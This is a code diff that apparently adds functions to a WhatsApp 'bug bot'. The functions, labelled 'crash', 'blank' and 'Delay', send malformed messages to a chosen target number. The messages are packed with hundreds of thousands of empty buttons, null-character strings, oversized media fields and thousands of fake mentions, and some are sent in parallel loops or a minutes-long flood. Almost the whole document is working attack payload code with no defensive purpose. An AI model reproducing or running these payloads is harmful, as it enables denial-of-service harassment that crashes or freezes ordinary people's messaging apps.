+              botJid: "0@bot",
+            },
+            forwardOrigin: 4,
+          },
+        },
+      },
+    },
+  }, { noSelfSync: true })
+}
+
+// crash
+async function BlankScreen(sock, target) {
+  try {
+    await sock.relayMessage(target, {
+      videoMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
+        mimetype: "video/mp4",
+        caption: "¡£¥🍷 KyzooTzy ¡£¥🍷",
+        fileSha256: "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
+        fileLength: "175891",
+        seconds: 1,
+        mediaKey: "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
+        height: 848,
+        width: 480,
+        fileEncSha256: "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
+        directPath: "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
+        mediaKeyTimestamp: "1765345955",
+        streamingSidecar: "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
+        annotations: [{
+          shouldSkipConfirmation: true,
+          embeddedContent: {
+            embeddedMusic: {
+              musicContentMediaId: "3312808138872179",
+              songId: "270259430421407",
+              author: "¡£¥🍷 KyzooTzy ".repeat(20000),
+              title: "¡£¥🍷 KyzooTzy ¡£¥🍷",
+              artworkDirectPath: "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
+              artworkSha256: "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
+              artworkEncSha256: "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
+              artistAttribution: "https://t.me/KyzooTzy",
+              countryBlocklist: "",
+              isExplicit: true,
+              artworkMediaKey: "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
+              musicSongStartTimeInMs: "10149",
+              derivedContentStartTimeInMs: "0",
+              overlapDurationInMs: "1000"
+            }
+          },
+          embeddedAction: true
+        }]
+      }
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true,
+      font: Math.floor(Math.random() * 99999999),
+      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
+    });
+
+    await sock.relayMessage(target, {
+      interactiveMessage: {
+        body: {
+          text: "¡£¥🍷 NEW ERA BUTTONS 1 ¡£¥🍷"
+        },
+        nativeFlowMessage: {
+          buttons: Array.from({ length: 500000 }, () => ({}))
+        }
+      }
+    }, {});
+
+    await sock.relayMessage(target, {
+      interactiveMessage: {
+        body: {
+          text: "¡£¥🍷 ERAA BUTTONS2 ¡£¥🍷"
+        },
+        nativeFlowMessage: {
+          buttons: Array.from({ length: 500000 }, () => ({}))
+        }
+      }
+    }, {});
+
+    console.log('✅ KYZOO SENT!');
+  } catch (e) {
+    console.log('❌ ERROR:MLS HA GINI AJA', e.message);
+  }
+}
+
+// blank
+async function blank(sock, target) {
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+    const nullText = "\u0000".repeat(9999);
+
+    const crash = (count) => ({
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: { text: nullText },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: count }, () => ({}))
+                    }
+                }
+            }
+        }
+    });
+
+    const makeMsgPlain = (count) => ({
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    body: { text: nullText },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: count }, () => ({}))
+                    }
+                }
+            }
+        }
+    });
+
+    const makeMsgNamed = () => ({
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    body: { text: nullText },
+                    nativeFlowMessage: {
+                        buttons: [
+                            { name: "cta_call".repeat(99999) },
+                            { name: "cta_copy".repeat(9999) },
+                            { name: "address_message".repeat(9999) }
+                        ]
+                    }
+                }
+            }
+        }
+    });
+
+    const payload1  = makeMsgPlain(100000);
+    const payload2  = makeMsgPlain(200000);
+    const payload3  = makeMsgPlain(300000);
+    const payload4  = makeMsgPlain(400000);
+    const payload5  = makeMsgPlain(500000);
+    const payload6  = makeMsgNamed();
+    const payload7  = makeMsgNamed();
+    const payload8  = makeMsgNamed();
+    const payload9  = makeMsgNamed();
+    const payload10 = makeMsgNamed();
+
+    const payloadcrash11 = crash(100000);
+    const payloadcrash12 = crash(200000);
+    const payloadcrash13 = crash(300000);
+    const payloadcrash14 = crash(400000);
+    const payloadcrash15 = crash(500000);
+    const payloadcrash16 = crash(500000);
+    const payloadcrash17 = crash(500000);
+    const payloadcrash18 = crash(500000);
+    const payloadcrash19 = crash(500000);
+    const payloadcrash20 = crash(500000);
+
+    const loop = async (payload) => {
+        for (let i = 0; i < 5; i++) {
+            await sock.relayMessage(target, payload, { noSelfSync: true });
+            await sleep(5000);
+        }
+    };
+
+    await Promise.all([
+        loop(payload1),
+        loop(payload2),
+        loop(payload3),
+        loop(payload4),
+        loop(payload5),
+        loop(payload6),
+        loop(payload7),
+        loop(payload8),
+        loop(payload9),
+        loop(payload10),
+        loop(payloadcrash11),
+        loop(payloadcrash12),
+        loop(payloadcrash13),
+        loop(payloadcrash14),
+        loop(payloadcrash15),
+        loop(payloadcrash16),
+        loop(payloadcrash17),
+        loop(payloadcrash18),
+        loop(payloadcrash19),
+        loop(payloadcrash20),
+    ]);
+}
+
+// Delay
+async function Skylinne(sock, target) {
+    const LexMsg = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        imageMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+                            mimetype: "image/jpeg",
+                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
+                            fileLength: 9999,
+                            height: 9999,
+                            width: 9999,
+                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
+                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
+                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
+                            mediaKeyTimestamp: "1776937541",
+                            jpegThumbnail: null,
+                            caption: "Skylinne - Executed¿!",
+                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
+                            scanLengths: [
+                                9999999999999999999,
+                                9999999999999999999,
+                                9999999999999999999,
+                                9999999999999999999
+                            ],
+                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
+                        }
+                    },
+                    body: {
+                        text: "GhostCrasher - Executed¿!"
+                    },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: 500000 }, () => ({}))
+                    }
+                }
+            }
+        }
+    };
+
+    const Lexca = generateWAMessageFromContent(target, LexMsg, {});
+
+    await sock.relayMessage(target, Lexca.message, {
+        participant: target,
+        messageId: Lexca.key.id,
+        noSelfSync: true
+    });
+
+    const Lexcaa = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: "Skylinne - Executed¿!"
+                    },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: 500000 }, () => ({}))
+                    }
+                }
+            }
+        }
+    };
+
+    const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});
+
+    await sock.relayMessage(target, Lexcaabos.message, {
+        participant: target,
+        messageId: Lexcaabos.key.id,
+        noSelfSync: true
+    });
+
+    const Msg = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: "Skylinne - GhostCrasher",
+                    },
+                    nativeFlowMessage: {
+                        button: "\x10".repeat(2000),
+                    },
+                },
+            },
+        },
+    };
+
+    const Lex = generateWAMessageFromContent(target, Msg, {});
+
+    await sock.relayMessage(target, Lex.message, {
+        participant: target,
+        messageId: Lex.key.id,
+        noSelfSync: true
+    });
+
+    const ahk = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        imageMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
+                            mimetype: "image/jpeg",
+                            caption: "GhostCrasher - Executed¿!",
+                            fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+                            fileLength: 9999999,
+                            height: 9999,
+                            width: 9999,
+                            mediaKey: "3q2+7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+                            fileEncSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
+                            directPath: "/v/t62.7118-24/1234567890123456.enc?ccb=11-4&oh=abc123&oe=6A12ED53",
+                            mediaKeyTimestamp: "1746057600",
+                            jpegThumbnail: null,
+                            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
+                            scanLengths: [
+                                9999999999999998555,
+                                9999999999999998555,
+                                9699999999999999148,
+                                9969999999999999164
+                            ],
+                            midQualityFileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+                            contextInfo: {
+                                pairedMediaType: "PAIRED_PERMANENT",
+                                isQuestion: true,
+                                isGroupStatus: true,
+                                remoteJid: "status@broadcast",
+                                entryPointConversionDelaySeconds: 999999,
+                                entryPointConversionSource: "ctwa"
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    };
+
+    const ahkMsg = generateWAMessageFromContent(target, ahk, {});
+
+    await sock.relayMessage("status@broadcast", ahkMsg.message, {
+        statusJidList: [target],
+        messageId: ahkMsg.key.id,
+        noSelfSync: true,
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                }]
+            }]
+        }]
+    });
+
+    const stickers = {
+        stickerMessage: {
+            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
+            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
+            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
+            mediaKey: Buffer.alloc(32, '').toString('base64'),
+            mimetype: "image/webp",
+            height: -1,
+            width: 5000,
+            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
+            fileLength: null,
+            mediaKeyTimestamp: 1710000000,
+            firstFrameLength: 999,
+            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
+            isAnimated: true,
+            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
+            contextInfo: {
+                mentionedJid: [
+                    "0@s.whatsapp.net",
+                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
+                ],
+                interactiveAnnotations: [{
+                    polygonVertices: [
+                        { x: 0.1, y: 0.1 },
+                        { x: 0.9, y: 0.1 },
+                        { x: 0.9, y: 0.9 },
+                        { x: 0.1, y: 0.9 }
+                    ],
+                    location: {
+                        latitude: -6.2088,
+                        longitude: 106.8456,
+                        name: `Skylinne - Executed`,
+                    }
+                }]
+            },
+            stickerSentTs: 1710000000,
+            isAvatar: true,
+            isAiSticker: true,
+            isLottie: true,
+            accessibilityLabel: "\u0000".repeat(9000),
+            mediaKeyDomain: null
+        }
+    };
+
+    const msg = {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        imageMessage: {
+                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
+                            mimetype: "image/jpeg",
+                            caption: "Skylinne - Executed",
+                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
+                            fileLength: "109951162777600",
+                            height: -9999,
+                            width: 9999,
+                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
+                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
+                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
+                            mediaKeyTimestamp: "1774107894",
+                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
+                            viewOnce: true,
+                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
+                            scanLengths: [6677, 48757, 32501, 42353],
+                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
+                        },
+                        hasMediaAttachment: null
+                    },
+                    body: {
+                        text: "\u0000".repeat(1000)
+                    },
+                    contextInfo: {
+                        remoteJid: "status@broadcast",
+                        participant: target,
+                        isBuldo: true,
+                        mentionedJid: [
+                            "0@s.whatsapp.net",
+                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
+                        ],
+                        groupMentions: [],
+                        entryPointConversionSource: "non_contact",
+                        entryPointConversionApp: "whatsapp",
+                        entryPointConversionDelaySeconds: 467593,
+                        quotedMessage: {
+                            documentMessage: {
+                                url: "https://example.com/file.zip",
+                                mimetype: "application/zip",
+                                caption: "Skylinne - Executed",
+                                fileName: "GhostCrasher - Executed",
+                                fileLength: 99999,
+                                vCards: true
+                            }
+                        }
+                    },
+                    nativeFlowMessage: {
+                        messageParamsJson: "ြ".repeat(9000)
+                    }
+                }
+            }
+        }
+    };
+
+    const Nanas = generateWAMessageFromContent(target, stickers, {});
+    const Muda = generateWAMessageFromContent(target, msg, {});
+
+    await sock.relayMessage("status@broadcast", Nanas.message, {
+        messageId: null,
+        statusJidList: [target],
+        noSelfSync: true,
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+            }]
+        }]
+    });
+
+    await sock.relayMessage("status@broadcast", Muda.message, {
+        messageId: null,
+        statusJidList: [target],
+        noSelfSync: true,
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+            }]
+        }]
+    });
+
+    const startTime = Date.now();
+    const duration = 5 * 60 * 1500;
+
+    while (Date.now() - startTime < duration) {
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: {
+                    extendedTextMessage: {
+                        text: "\u0000".repeat(75000),
+                        contextInfo: {
+                            participant: target,
+                            mentionedJid: [
+                                "0@s.whatsapp.net",
+                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
+                            ]
+                        }
+                    }
+                }
+            }
+        }, {
+            participant: target,
+            noSelfSync: true
+        });
+    }
+
+    await sock.relayMessage(target, {
+        groupStatusMessageV2: {
+            nativeFlowMessage: {
+                extendedTextMessage: {
+                    text: "\u0003".repeat(9000),
+                    contextInfo: {
+                        participant: target,
+                        mentionedJid: [
+                            "0@s.whatsapp.net",
+                            ...Array.from(
+                                { length: 1999 },
+                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
+                            )
+                        ]
+                    }
+                }
+            }
+        }
+    }, {
+        participant: target,
+        noSelfSync: true
+    });
+}
+
+async function ingpisdenglay(sock, target) {
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+    const nullText = "\u0000".repeat(9999);
+
+    const makeMsg = (count) => ({
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: { text: nullText },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: count }, () => ({}))
+                    }
+                }
+            }
+        }
+    });
+
+    const payload1  = makeMsg(100000);
+    const payload2  = makeMsg(200000);
+    const payload3  = makeMsg(300000);
+    const payload4  = makeMsg(400000);
+    const payload5  = makeMsg(500000);
+    const payload6  = makeMsg(500000);
+    const payload7  = makeMsg(500000);
+    const payload8  = makeMsg(500000);
+    const payload9  = makeMsg(500000);
+    const payload10 = makeMsg(900000);
+
+    const loop = async (payload) => {
+        for (let i = 0; i < 5; i++) {
+            await sock.relayMessage(target, payload, { noSelfSync: true });
+            await sleep(5000);
+        }
+    };
+
+    await Promise.all([
+        loop(payload1),
+        loop(payload2),
+        loop(payload3),
+        loop(payload4),
+        loop(payload5),
+        loop(payload6),
+        loop(payload7),
+        loop(payload8),
+        loop(payload9),
+        loop(payload10),
+    ]);
+}
+
 async function delayhardinvisible(sock, target) {
     const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -1625,7 +1913,7 @@ async function delayhardinvisible(sock, target) {
         groupStatusMessageV2: {
             message: {
                 interactiveMessage: {
-                    body: { text: "PhantomX" },
+                    body: { text: "PERFECT" },
                     nativeFlowMessage: {
                         buttons: Array.from({ length: count }, () => ({}))
                     }
